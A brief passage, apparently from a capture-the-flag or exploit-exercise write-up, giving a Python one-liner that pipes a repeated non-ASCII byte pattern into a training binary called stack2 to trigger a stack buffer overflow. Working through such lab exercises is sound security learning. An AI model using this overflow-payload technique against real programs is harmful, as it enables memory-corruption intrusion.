This answer uses the same approach as the previous one, but uses non-ASCII values. Luckily, python can easily handle it:
python -c "a = '\x05\x03\x02\x01' * 21; print(a)" | ./stack2
